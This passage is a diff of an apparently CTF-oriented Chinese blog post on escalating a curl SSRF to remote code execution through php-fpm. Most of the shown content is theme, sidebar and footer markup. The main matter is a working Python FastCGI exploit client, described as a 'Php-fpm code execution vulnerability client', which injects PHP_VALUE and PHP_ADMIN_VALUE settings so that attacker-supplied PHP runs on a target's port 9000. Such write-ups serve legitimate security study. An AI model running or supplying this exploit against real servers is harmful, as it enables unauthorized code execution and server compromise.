bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">'connect failure! please check your fasctcgi-server !!'</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line"></span><br><span class="line">        self.sock.send(request)</span><br><span class="line">        self.requests[requestId][<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_SEND</span><br><span class="line">        self.requests[requestId][<span class="string">'response'</span>] = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">return</span> self.__waitForResponse(requestId)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br></pre></td></tr></table></figure>
 <blockquote>
@@ -169,128 +252,254 @@
 </blockquote>
 <p>访问2.txt<br><img src="https://md.byr.moe/uploads/upload_d95ff4da13ee28b5fe8601c58b14c4cf.png" alt></p>
 
-  </div>
-</article>
+    </div>
 
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SSRF/" rel="tag"># SSRF</a>
+              <a href="/tags/php/" rel="tag"># php</a>
+              <a href="/tags/fpm/" rel="tag"># fpm</a>
+          </div>
+
+        
 
 
         
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/archives">Writing</a></li>
-         
-          <li><a href="/tags">Tags</a></li>
-         
-          <li><a href="/categories/">Categories</a></li>
-         
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/09/30/ThinkPHP6-0反序列化利用链/" rel="prev" title="ThinkPHP6.0反序列化利用链">
+      <i class="fa fa-chevron-left"></i> ThinkPHP6.0反序列化利用链
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/01/17/PHP源码分析-零-调试环境搭建/" rel="next" title="PHP源码分析(零):调试环境搭建">
+      PHP源码分析(零):调试环境搭建 <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
-
-    <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.</span> <span class="toc-text">SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">2.</span> <span class="toc-text">RCE</span></a></li></ol>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&text=curl-SSRF+FPM造成RCE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&is_video=false&description=curl-SSRF+FPM造成RCE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=curl-SSRF+FPM造成RCE&body=Check out this article: http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&title=curl-SSRF+FPM造成RCE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http:/blog.boyblog.club/2019/11/22/curl-SSRF-FPM造成RCE/&name=curl-SSRF+FPM造成RCE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
 
   </div>
-</div>
 
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2020 Sndav@Dubhe
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/archives">Writing</a></li>
-         
-          <li><a href="/tags">Tags</a></li>
-         
-          <li><a href="/categories/">Categories</a></li>
-         
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
-    </nav>
-  </div>
-</footer>
 
-    </div>
-    <!-- styles -->
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+          </div>
+          
 
-    <!-- jquery -->
-<script src="/lib/jquery/jquery.min.js"></script>
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-<script src="/js/main.js"></script>
-<!-- search -->
-
-<!-- Google Analytics -->
-
-    <script type="text/javascript">
-        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
-        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
-        ga('create', 'UA-143542187-1', 'auto');
-        ga('send', 'pageview');
-    </script>
-
-<!-- Baidu Analytics -->
-
-<!-- Disqus Comments --><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
-</script>
-
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Queue(function() {
-    var all = MathJax.Hub.getAllJax(), i;
-    for(i=0; i < all.length; i += 1) {
-      all[i].SourceElement().parentNode.className += ' has-jax';
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
     }
   });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
 </script>
 
-<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">1.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE"><span class="nav-number">2.</span> <span class="nav-text">RCE</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Sndav@Dubhe</p>
+  <div class="site-description" itemprop="description">A Dubhe CTFer lives harder and harder</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Sndav@Dubhe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.8.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/pjax/pjax.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.getAttribute('pjax') !== null) {
+      script.setAttribute('pjax', '');
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
 </script>
-<!-- End: Injected MathJax -->
-<!-- hexo-inject:end -->
 
 
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </body>
 </html>
